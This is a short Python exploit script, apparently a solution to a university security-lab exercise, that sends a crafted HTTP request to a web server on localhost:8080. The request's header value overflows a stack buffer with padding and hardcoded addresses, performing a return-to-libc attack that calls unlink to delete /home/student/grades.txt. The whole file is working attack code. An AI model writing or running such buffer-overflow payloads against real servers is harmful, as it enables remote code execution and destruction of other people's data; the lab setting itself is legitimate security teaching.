#!/usr/bin/env python3
import urllib.parse
import socket
import struct

addr_value = 0x7fffffffd9d0
addr_accidently = 0x555555556c35
addr_libc_unlink = 0x1555553f80a0
rbp_http_request_headers = 0x7fffffffdbe0


def build_exploit() -> bytes:
    req = b"GET / HTTP/1.0\r\n"

    k = b"ABC: "  # not matter
    v = b"/home/student/grades.txt\0"
    v += b'A' * ((rbp_http_request_headers - addr_value) - len(v))  # garbage
    v += struct.pack("<Q", rbp_http_request_headers + 16)
    v += struct.pack("<Q", addr_accidently)
    v += struct.pack("<Q", addr_libc_unlink)
    v += struct.pack("<Q", addr_value)
    request_header = k + urllib.parse.quote_from_bytes(v).encode('ascii') + b"\r\n"

    req += request_header
    req += b"\r\n"

    return req


def send_req(host: str, port: int, req: bytes):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))

    print("send request...")
    sock.send(req)


if __name__ == "__main__":
    print("exploit-5.py: unlink /home/student/grades.txt")
    print("Return to libc attacks")

    host = "localhost"
    port = 8080
    req = build_exploit()
    send_req(host, port, req)
